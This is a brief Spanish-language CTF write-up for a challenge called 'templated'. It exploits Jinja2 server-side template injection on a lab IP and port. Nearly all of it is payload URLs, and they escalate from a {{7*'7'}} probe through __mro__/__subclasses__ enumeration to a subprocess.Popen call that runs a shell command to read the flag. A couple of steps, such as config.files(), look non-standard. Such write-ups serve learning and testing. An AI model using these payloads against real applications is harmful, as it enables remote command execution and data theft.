## README templated challenge

- Vulnerabilidad en los Server Side Template Injection con Jinja2

- Vemos que es vulnerable frente a SSTI mediante:
	* `http://157.245.40.149:31530/{{7*'7'}}`

- Vemos los ficheros con:
	* `http://157.245.40.149:31530/{{config.files()}}`

- Leemos los métodos que existen con:
	* `http://157.245.40.149:31530/{{ config.from_object(‘os’) }}`
	* `http://157.245.40.149:31530/{{config.files()}}`
	

Cualquier item que se encuentre en el objeto config puede ejecutar bajo la vulnerabilidad SSTI.Necesario conocer bien que hacen \_\_mro\_\_ y \_\_subclasses\_\_.

- Seleccionamos un nuevo estilo de objeto para acceder al objeto base
	* `http://157.245.40.149:31530/{{''.__class__.__mro__}}`
- Vemos las funciones que hay mediante
	* `http://157.245.40.149:31530/{{''.__class__.__mro__[1].__subclasses__()}}`

- Vemos que la función `<class 'subprocess.Popen'>` se encuentra en el número 414

- Comando final
	* `http://157.245.40.149:31530/{{''.__class__.__mro__[1].__subclasses__()[414]('cat flag.txt',shell=True,stdout=-1).communicate()}}`
